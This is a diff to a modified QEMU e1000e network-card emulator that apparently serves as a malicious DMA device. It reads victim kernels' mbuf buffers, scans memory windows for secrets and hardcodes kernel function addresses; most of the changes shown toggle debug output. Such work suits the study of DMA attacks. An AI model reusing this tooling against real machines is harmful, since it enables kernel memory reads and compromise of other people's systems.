@@ -1022,7 +1022,7 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
         return;
     }
 
-	record_tx_windows(core);
+	/*record_tx_windows(core);*/
 
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
@@ -1068,7 +1068,7 @@ start_recv(E1000ECore *core)
 
     trace_e1000e_rx_start_recv();
 
-	/*print_rx_buffer_address_information(core);*/
+	print_rx_buffer_address_information(core);
 
     for (i = 0; i <= core->max_queue_num; i++) {
         qemu_flush_queued_packets(qemu_get_subqueue(core->owner_nic, i));
@@ -2673,7 +2673,7 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
     core->mac[index] = val & 0xffff;
 
 	/*PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));*/
-	/*print_tx_buffer_address_information(core);*/
+	print_tx_buffer_address_information(core);
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
@@ -3715,8 +3715,6 @@ get_buffer_address_from_tx_descriptor(E1000ECore *core,
 	return le64_to_cpu(desc.buffer_addr);
 }
 
-
-
 void
 print_buffer_address_information(E1000ECore *core,
 	dma_addr_t descriptor_addr, void *opaque)
@@ -3726,10 +3724,11 @@ print_buffer_address_information(E1000ECore *core,
 	get_buffer_address_fp get_buffer_address = (get_buffer_address_fp)(opaque);
 	hwaddr ba = get_buffer_address(core, descriptor_addr);
 
-	printf("Buffer: 0x%lx.\n", ba);
+	printf("Buffer: 0x%lx.", ba);
 	if (ba % 2048 == 0) {
-		printf("Address is 2K aligned. Probably cluster.");
+		puts("Address is 2K aligned. Probably cluster. ");
 	} else {
+		putchar('\n');
 		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
 			sizeof(struct mbuf));
 #ifdef VICTIM_MACOS
@@ -3740,7 +3739,7 @@ print_buffer_address_information(E1000ECore *core,
 		print_freebsd_mbuf_information(&mbuf_buffer);
 #endif
 	}
-	hexdump((uint8_t *)(&mbuf_buffer), 256);
+	/*hexdump((uint8_t *)(&mbuf_buffer), 256);*/
 }
 
 struct window {
@@ -3865,7 +3864,7 @@ check_windows_for_secret(E1000ECore *core)
 		return;
 	}
 
-	putchar('c'); fflush(stdout);
+	/*putchar('c'); fflush(stdout);*/
 
 	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
 		read_result = perform_dma_long_read(page, entry->window.length,
@@ -3946,22 +3945,6 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 	check_windows_for_secret(core);
 }
 #endif
-
-void
-print_macos_mbuf(E1000ECore *core, hwaddr ba)
-{
-	struct mbuf mbuf;
-
-	PDBG("Attempting to subvert buffer with address 0x%lx.", ba);
-
-	if ((ba % 2048) == 0) {
-		PDBG("Buffer is probably a cluster.");
-		return; /* Probably a cluster */
-	}
-
-
-}
-
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
 const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
